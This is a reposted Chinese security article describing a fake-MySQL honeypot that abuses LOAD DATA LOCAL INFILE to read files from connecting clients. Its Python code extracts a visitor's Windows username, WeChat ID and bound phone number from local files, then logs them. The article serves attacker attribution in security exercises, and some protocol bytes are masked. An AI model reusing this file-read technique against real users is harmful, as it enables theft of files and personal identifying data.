> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/I9EkChJDkwpMw4LaJO_fuw)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fuBhZCW25hNtiawibXa6jdibJO1LiaaYSDECImNTbFbhRx4BTAibjAv1wDBA/640?wx_fmt=png)

扫码领资料

获黑客教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png)

> 作者：Obsidian
> 
> 介绍：通过`MySQL`任意文件读取，获取攻击者的微信以及绑定手机号。
> 
> 转载自：https://www.freebuf.com/articles/web/270053.html

**0x00 前言**
-----------

之前在打 CTF 的时候，多次遇到了这个漏洞。

攻防演练期间，研究了一下蜜罐的骚操作，比如**获取百度 ID、CSDN 账号、微信 ID 等等，对攻击者进行攻击者画像。**

学习了一下原理，然后**做了一些改进，利用 MySQL 的漏洞，获取攻击者手机号。**

本系统代码非完全原创，部分代码参照

https://github.com/qigpig/MysqlHoneypot。

关于 MySQL 任意文件读取漏洞，网上很多大佬写了很详细的分析文章，本文不再复述。

同时，如果想复现漏洞，也可选取 github 上其他更加简洁的单文件 server 代码。

**0x01 漏洞相关**
-------------

### **1.1 漏洞简介**

Fake MySQL 顾名思义，就是虚假的 MySQL。

其实这个名词是我个人习惯的称呼，关于完整的定义目前在网上没有一个公认的说法。

以下均为个人理解，如有问题，欢迎指正。

Fake MySQL 是基于构造一个伪装的 MySQL 服务器，通过命令或诱导来使受害者连接此服务器，从而利用 MySQL 的相关漏洞进行文件读取，或者反序列化利用。

本文不涉及反序列化的利用，可以简单理解为一个 MySQL 蜜罐，利用漏洞为 LOAD DATA LOCAL INFILE 的任意文件读取。

以上就是本文全部废话了，话不多说，直接进入正题。

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSELicS13WJQVX2poOSy6xGzAw7HkcFqCcREP2HKHaIAwGbmsZ4WY4bSzl83icwtiaTyll3U6S3rT0ibicA/640?wx_fmt=jpeg)

### **1.2 漏洞复现及利用**

文字废话太多，直接上图吧。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzAelAP9X9xibrdd1uZOjO4WOTBopqGlQZibvZ0O6RlSHa43gtic4zLrVWKw/640?wx_fmt=png)

如图所示当我在服务器上运行 payload 代码，并设置我想要读取的文件，即可进入监听模式。  

当攻击者连接我的 3306 端口，即可成功读取到攻击者电脑上的对应文件。

Linux 同理，可以读取 / etc/passwd 等文件。

那么，可以读文件，进一步怎样拓展呢？

根据大佬的文章，我们可以通过读取 C:\Windows\PFRO.log 文件来获取攻击者的用户名，根据用户名读取相应文件夹中的微信配置文件，进而获取微信 ID。

前提是微信文件保存路径为默认。

获取用户名，如图所示

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzAc4dSaqylPw2JEUUkqy7ULZDJWJotb2RWzx7uo6QkGUWG1FW0qmzgfg/640?wx_fmt=png)

但这种方式的缺点是，只能单文件读取，每次需要重新设置文件名，不能实现循环读取。  

于是，根据 https://github.com/qigpig/MysqlHoneypot 中的部分代码，进行进一步的完善和修改，就有了下面的内容

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzA0ibyASibMQTkm42VYT5MPsialDTnJHClYaKp8rKLEB6ickjTGqiays0ZQbA/640?wx_fmt=png)

**0x02 工具相关**  

----------------

### **2.1 代码相关**

开门见山，本系统代码乍一看很完美，但以普遍理性而论，仅适用于读取 windows 系统的文件。

先看核心代码

```
def mysql_get_file_content(filename,conn,address):
    logpath = os.path.abspath('.') + "/log/" + address[0]
    if not os.path.exists(logpath):
        os.makedirs(logpath)
    conn.sendall("xxx")
    try:
        conn.recv(1024000)
    except Exception as e:
        print(e)

    try:
        conn.sendall("xx")
        res1 = conn.recv(1024000)
        # SHOW VARIABLES
        if 'SHOW VARIABLES' in res1:
            conn.sendall("xxx")
            res2 = conn.recv(9999)
            if 'SHOW WARNINGS' in res2:
                conn.sendall("xxx")
                res3 = conn.recv(9999)
                if 'SHOW COLLATION' in res3:
                    conn.sendall("xxx")
                    res4 = conn.recv(9999)
                    if 'SET NAMES utf8' in res4:
                        conn.sendall("xxx")
                        res5 = conn.recv(9999)
                        if 'SET character_set_results=NULL' in res5:
                            conn.sendall("xxx")
                            conn.close()
                    else:
                        conn.close()
                else:
                    conn.close()
            else:
                conn.close()
        else:
            try:
                wantfile = chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
                conn.sendall(wantfile)
                content=''
                while True:
                    data = conn.recv(1024)
                    print len(data)
                    content += data
                    if len(data) < 1024:
                        print 'ok'
                        break
                    
                conn.close()
                item=logpath + "/" + filename.replace("/", "_").replace(":", "")+'_'+str(random.random())
                if len(content) > 6:
                    with open(item, "w") as f:
                        f.write(content)
                        f.close()
                    return (True,content)
                else:
                    return (False,content)
            except Exception as e:
                print (e)
    except Exception as e:
        print (e)
```

这段代码主要有两个作用：

> 1. 判断是否为扫描器或者密码爆破工具，进行交互握手，效果是扫描器直接爆`3306`弱口令。
> 
> 2. 如果是直接连接，去读取设定好的文件，并写入本地保存。

PS：为了防止读取文件内容不完整，加入了 while 循环。

```
while True:
        conn, address = sv.accept()
        first_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        global files1
        global username
        global wx_id
        file=files1[0].replace('Administrator',username).replace('wx_id',wx_id)
        res,content = mysql_get_file_content(file,conn,address)
        files1.append(files1[0])
        files1.remove(files1[0])
        if res:
            if 'PFRO' in file:
                username = get_username(content)
                s= "xx" % (xx)
                cursor.execute(s)
                data = cursor.fetchall()
                if len(data)==0:
                    s = "XX" % (xx)
                    cursor.execute(s)
                    db.commit()
                    print 'success:'+ file
                    insert_file(file,address,username)
            elif 'config.data'in file:
                content = content
                wxid = re.findall(r'WeChatFiles\\(.*)\\config', content)[0]
                sql = "xxx" % (xxx)
                cursor.execute(sql)
                db.commit()
                wx_id=wxid
                img = qrcode.make('weixin://contacts/profile/'+wxid)
                img.save(os.path.abspath('.')+'/static/pic/'+wxid+'.png') 
                print 'success:'+ file
                insert_file(file,address,username)
            elif 'AccInfo' in file:
                content = content
                phone = re.findall(r'[0-9]{11}', content)[-1]
                sql = "xxx" % (xxx)
                cursor.execute(sql)
                db.commit()
                print 'success:'+ file
                insert_file(file,address,username)
        else:
            files1=files
            username='Administrator'
```

这段代码就是从文件内容获取信息并保存到数据库：

> 1. 从`C:/Windows/PFRO.log`中读取用户名
> 
> 2. 从`C:/Users/用户名/Documents/WeChat Files/All Users/config/config.data`中读取`wx_id`
> 
> 3. 从`C:/Users/用户名/Documents/WeChat Files/wx_id/config/AccInfo.dat`中读取微信绑定的手机号

根据 wx_id 可生成微信二维码，可添加好友

根据实际测试，就算关掉了所有好友申请条件，仍可通过此二维码发起好友申请。

剩下的代码无非就是，前端显示了，这里就不展示了，直接上效果图。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzAd6YjoLznwIzbfF4sYad6xUwdnNhtFtVfFwDRn3CGElmdwlxFSIOjuw/640?wx_fmt=png)

### **2.2 效果图**  

首先，docker 启动。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzAAJMlS8QEsXJo79SeEeiaFY4picfKnqKxdHUwWpLfMFfaOBAIJAdqlVLA/640?wx_fmt=png)

本来想在 80 端口结合 jsonp 获取一下百度 id 以及其他信息

但无奈公开的接口都失效了，80 端口只能作为一个诱饵了

下一步会研究一些如何获取百度等论坛的账号信息。  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzAr2D6tLI58uMoogt8MpDzvGj67aJg3kDdGgl5Uu1K0Bh5AMrEphCA9Q/640?wx_fmt=png)

访问 5000 端口。  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzAErSamXshawcLhfu28cpib9UEl4RejR2JMgypibwIYdhItWPdTk32JqDA/640?wx_fmt=png)

登录后  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzA3M0trIab36v7oVNibIYsGKYWRHG4WlLaTbAMJzqC5b9EeiamstIsqlDQ/640?wx_fmt=png)

具体效果  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzAMUYwz77IGibXp4cZAlAxUBjOpQzyTBpqhYkWxpq5HXHg8fZgNmP78dw/640?wx_fmt=png)

目前实现了获取微信和手机号，对于溯源来说，已经足够用了。  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzA43TuVxNX4zcpnpFN0ibCMab4qkhMpfialkJJx2nmg7icxkXBHcKmHfSjg/640?wx_fmt=png)

### **2.3 吐槽相关**

前前后后，修修改改，花了差不多五天时间才完全搞定，但还是存在 bug，请多担待。

本来想增加 linux 文件的读取，但时间和精力有限，只能后续补上。

根据 qigpig 大佬的思路，本来想解决同一 IP 出口多用户的问题，但想来想去，只能通过用户名和 IP 进行双重绑定，如果读不到用户名，就没办法了。

职业不是程序员，写代码真的太难了。。。

**0x03 写在最后**
-------------

红队大佬可参考 http://www.python88.com/topic/105651 进行蜜罐甄别。

蓝队大佬不建议将本系统作为正式蜜罐部署，仅供参考和玩耍。

### **特别鸣谢**

感谢实验室 Zero、Bay0net、Goout 以及其他小伙伴的大力支持。

他们提供了非常有用的建议和思路，并对本系统的测试工作起到了不可磨灭的作用。

那么，下次 ** 的时候，叫上他们一起吧！

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSELicS13WJQVX2poOSy6xGzAkaeITWyZ0az7G4sJq6KCB1gNJlRfiauBVjrIa2VYzBMrDWOGlJhk28A/640?wx_fmt=png)

**0x04 Reference**  

---------------------

https://github.com/c0cc/fakeMysql

https://www.freebuf.com/articles/web/247976.html

https://github.com/qigpig/MysqlHoneypot

https://github.com/ev0A/Mysqlist

学习更多黑客技能！体验靶场实战练习

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFl47EYg6ls051qhdSjLlw0BxJG577ibQVuFIDnM6s3IfO3icwAh4aA9y93tNZ3yPick93sjUs9n7kjg/640?wx_fmt=png)

（黑客视频资料及工具）  

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CBJYPapLzSEDYDXMUyXOORnntKZKuIu5iaaqlBxRrM5G7GsnS5fY4V7PwsMWuGTaMIlgXxyYzTDWTxIUwndF8vw/640?wx_fmt=gif)

往期推荐

  

[

【黑客工具】Wireshark 3.4.5 （抓包工具最新中文版）



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247518047&idx=1&sn=e141fa0c6fa72483f71a45919134db22&chksm=ebeace72dc9d476469a3801334747943c9c064c83fbd14d84c4fbd2cb8648c5a4f23d82a6e51&scene=21#wechat_redirect)

[

挖洞经验 | 如何发现更多的越权漏洞



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247517851&idx=1&sn=2c81907b10a910e6b0cc7713642cadb5&chksm=ebeacfb6dc9d46a08607f1eca45dce0290a47ee73fc78754207bba75ba51b2d595ba74d97870&scene=21#wechat_redirect)

[

实战｜对母校的某站点渗透



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247517589&idx=1&sn=e7ca63f09570fb59ef40bfcdf6a2a4aa&chksm=ebeaccb8dc9d45aee227e05c8f217f2717032a5867051e9d281258cf1bca5395eb9101f020e4&scene=21#wechat_redirect)

[

Xray 挂机刷漏洞



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247517555&idx=1&sn=ceeeb3bb85901f1118246363e718e46b&chksm=ebeacc5edc9d45487e291ac1392cb5eef5ada63e252615350cbab0709f8a046ef729ce65602c&scene=21#wechat_redirect)

[

挖洞思路 | 账号攻击的几种常见手法



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247517432&idx=1&sn=46d392de6351f496fd794c0c39497a52&chksm=ebeacdd5dc9d44c3f3527ec1005e5ff1c4fe5079e688e6acfedad8f163f9c74b81e1bb31a61c&scene=21#wechat_redirect)

[

那些年的 Hvv 日记



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247515246&idx=1&sn=b1a73a93f8ce9a5d51ce3bed4ada1e56&chksm=ebeaf543dc9d7c557c36881cccaaffad5312938ad0450dc1e4050de583523c2a27ba5ab3a469&scene=21#wechat_redirect)

[

网友发了个钓鱼网站，我用 Python 渗透了该网站所有信息



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247512251&idx=1&sn=7785d876c7a94154cbe41f287a0c1437&chksm=ebeaf996dc9d7080a1c1cb6ef3b8a22b8fa5d0de127eac0280c9db2c9d38dfcb4a4a45c44336&scene=21#wechat_redirect)